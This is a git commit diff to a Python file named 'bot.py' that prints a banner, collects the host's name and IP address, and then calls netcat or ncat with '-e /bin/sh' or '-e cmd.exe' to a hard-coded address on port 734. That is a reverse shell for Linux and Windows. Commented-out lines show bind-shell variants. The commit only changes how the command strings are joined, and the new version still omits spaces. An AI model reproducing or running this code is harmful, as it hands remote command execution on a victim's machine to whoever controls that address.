05a96d2729ebd96310432eb8be8cd9f4908ea78f
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-14 13:33:19 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -9,7 +9,7 @@ import socket
 def run():
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
-    iph= '172.16.32.58'
+    iph='172.16.32.58'
     print('')
     print(' ############### # # # ##############')
     print(' ####### ###### # #  # # ####### ####')
@@ -22,10 +22,10 @@ def run():
         print('Linux: ', sysconfig.get_platform()) 
         print(' IpAddress: ', IPAddr)
         #os.system( 'nc -lvp 734 -e /bin/sh')
-        os.system('nc',iph, '734 -e /bin/sh')
+        os.system('nc'+ iph+ '734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform()) 
         print('Address ip: ', IPAddr)
         #os.system('ncat -lvp 734 -e cmd.exe')
-        os.system('ncat', iph ,'734 -e cmd.exe')
+        os.system('ncat'+ iph +'734 -e cmd.exe')
     
